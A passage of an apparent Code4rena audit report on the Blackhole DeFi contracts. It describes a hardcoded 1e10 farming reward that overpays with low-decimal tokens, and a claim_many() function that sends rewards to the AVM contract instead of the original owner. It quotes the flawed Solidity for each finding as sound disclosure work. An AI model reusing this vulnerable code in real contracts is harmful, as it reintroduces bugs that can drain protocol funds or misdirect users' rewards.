implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-03-1e10-fixed-farming-reward-in-gaugefactorycl\" style=\"position:relative;\"\u003e\u003ca href=\"#m-03-1e10-fixed-farming-reward-in-gaugefactorycl\" aria-label=\"m 03 1e10 fixed farming reward in gaugefactorycl permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-127\"\u003e[M-03] \u003ccode\u003e1e10\u003c/code\u003e fixed farming reward in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-175\"\u003edanzero\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-descriptions-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-descriptions-and-impact\" aria-label=\"finding descriptions and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding descriptions and impact\u003c/h3\u003e\n\u003cp\u003eBelow is the implementation of the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function in \u003ccode\u003eGaugeFactoryCL.sol\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function is responsible for setting up initial incentives for Algebra concentrated liquidity farms, it uses a hardcoded reward amount of \u003ccode\u003e1e10\u003c/code\u003e raw units. This fixed amount is then used to determine the \u003ccode\u003erewardRate\u003c/code\u003e for the initial seeding of the Algebra farm \u003ccode\u003e(rewardRate = uint128(reward/remainingTimeInCurrentEpoch))\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe core issue is that \u003ccode\u003e1e10\u003c/code\u003e raw units represent a vastly different actual value and intended incentive level depending on the \u003ccode\u003e_rewardToken\u003c/code\u003e number of decimals:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFor an 18-decimal token: \u003ccode\u003e1e10\u003c/code\u003e raw units is 0.00000001 of a full token. This is typically an insignificant “dust” amount.\u003c/li\u003e\n\u003cli\u003eFor a 6-decimal token (e.g., USDC): \u003ccode\u003e1e10\u003c/code\u003e raw units is 10,000 full tokens (\u003ccode\u003e$10,000 if 1 token = $1\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eFor an 8-decimal token (e.g., WBTC): \u003ccode\u003e1e10\u003c/code\u003e raw units is 100 full tokens (\u003ccode\u003e$10,000,000 if 1 token = $100,000\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis fixed raw unit amount does not adapt to the specific \u003ccode\u003e_rewardToken\u003c/code\u003e being used for the gauge. As a result, if \u003ccode\u003e_rewardToken\u003c/code\u003e is low decimal token such as \u003ccode\u003eUSDC\u003c/code\u003e  or \u003ccode\u003eWBTC\u003c/code\u003e the resulting \u003ccode\u003erewardRate\u003c/code\u003e will be astronomically high which cause a huge loss for the protocol.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eModify the \u003ccode\u003eGaugeFactoryCL.createGauge\u003c/code\u003e function to accept an initial reward amount parameter. This allows the caller to specify an appropriate seed amount tailored to the specific \u003ccode\u003e_rewardToken\u003c/code\u003e, its decimals, and its value.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-29\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-04-logic-error-in-avm-original-owner-resolution\" style=\"position:relative;\"\u003e\u003ca href=\"#m-04-logic-error-in-avm-original-owner-resolution\" aria-label=\"m 04 logic error in avm original owner resolution permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-245\"\u003e[M-04] Logic error in AVM original owner resolution\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-114\"\u003emaze\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-239\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-2\" aria-label=\"finding description 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe RewardsDistributor contract contains an inconsistency in how it handles tokens managed by the Auto Voting Escrow Manager (AVM) system. In the \u003ccode\u003eclaim()\u003c/code\u003e function, there’s code to check if a token is managed by AVM and, if so, to retrieve the original owner for sending rewards. However, this critical check is missing in the \u003ccode\u003eclaim_many()\u003c/code\u003e function.\u003c/p\u003e\n\u003cp\u003eThis creates a discrepancy in reward distribution where:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eclaim()\u003c/code\u003e correctly sends rewards to the original owner of an AVM-managed token\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eclaim_many()\u003c/code\u003e incorrectly sends rewards to the current NFT owner (the AVM contract itself)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eRelevant code from \u003ccode\u003eclaim()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 